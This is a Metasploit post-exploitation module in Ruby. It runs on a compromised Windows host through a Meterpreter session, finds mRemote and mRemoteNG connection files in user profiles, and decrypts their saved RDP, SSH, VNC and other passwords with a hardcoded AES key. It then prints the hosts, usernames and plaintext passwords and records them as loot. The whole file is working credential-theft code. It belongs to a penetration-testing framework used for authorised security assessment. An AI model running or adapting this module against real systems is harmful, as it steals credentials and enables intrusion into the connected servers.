##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rexml/document'
require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather mRemote Saved Password Extraction',
        'Description'   => %q{
            This module extracts saved passwords from mRemote. mRemote stores
            connections for RDP, VNC, SSH, Telnet, rlogin and other protocols. It saves
            the passwords in an encrypted format. The module will extract the connection
            info and decrypt the saved passwords.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'theLightCosine',
            'hdm', #Helped write the Decryption Routine
            'mubix' #Helped write the Decryption Routine
          ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

  end

  def run
    @secret=  "\xc8\xa3\x9d\xe2\xa5\x47\x66\xa0\xda\x87\x5f\x79\xaa\xf1\xaa\x8c"

    grab_user_profiles().each do |user|
      next if user['LocalAppData'] == nil
      tmpath  = user['LocalAppData'] + '\\Felix_Deimel\\mRemote\\confCons.xml'
      ng_path = user['AppData'] + '\\mRemoteNG\\confCons.xml'
      get_xml(tmpath)
      get_xml(ng_path)
    end
  end

  def get_xml(path)
    print_status("Looking for #{path}")
    begin
      if file_exist?(path)
        condata = read_file(path)
        loot_path = store_loot('mremote.creds', 'text/xml', session, condata, path)
        vprint_good("confCons.xml saved to #{loot_path}")
        parse_xml(condata)
        print_status("Finished processing #{path}")
      end
    rescue Rex::Post::Meterpreter::RequestError
      print_status("The file #{path} either could not be read or does not exist")
      return
    end
  end

  def parse_xml(data)

    mxml= REXML::Document.new(data).root
    mxml.elements.to_a("//Node").each do |node|

      host = node.attributes['Hostname']
      port = node.attributes['Port']
      proto = node.attributes['Protocol']
      user = node.attributes['Username']
      domain = node.attributes['Domain']
      epassword= node.attributes['Password']
      next if epassword == nil || epassword == ""

      decoded = epassword.unpack("m*")[0]
      iv = decoded.slice!(0,16)
      pass = decrypt(decoded, @secret , iv, "AES-128-CBC")
      print_good("HOST: #{host} PORT: #{port} PROTOCOL: #{proto} Domain: #{domain} USER: #{user} PASS: #{pass}")

      service_data = {
        address: host,
        port: port,
        service_name: proto,
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }

      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: self.refname,
        private_type: :password,
        private_data: pass,
        username: user
      }

      if domain.present?
        credential_data[:realm_key]   = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
        credential_data[:realm_value] = domain
      end

      credential_data.merge!(service_data)

      # Create the Metasploit::Credential::Core object
      credential_core = create_credential(credential_data)

      # Assemble the options hash for creating the Metasploit::Credential::Login object
      login_data = {
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
      }

      # Merge in the service data and create our Login
      login_data.merge!(service_data)
      create_credential_login(login_data)
    end
  end

  def decrypt(encrypted_data, key, iv, cipher_type)
    aes = OpenSSL::Cipher.new(cipher_type)
    aes.decrypt
    aes.key = key
    aes.iv = iv if iv != nil
    aes.update(encrypted_data) + aes.final
  end
end
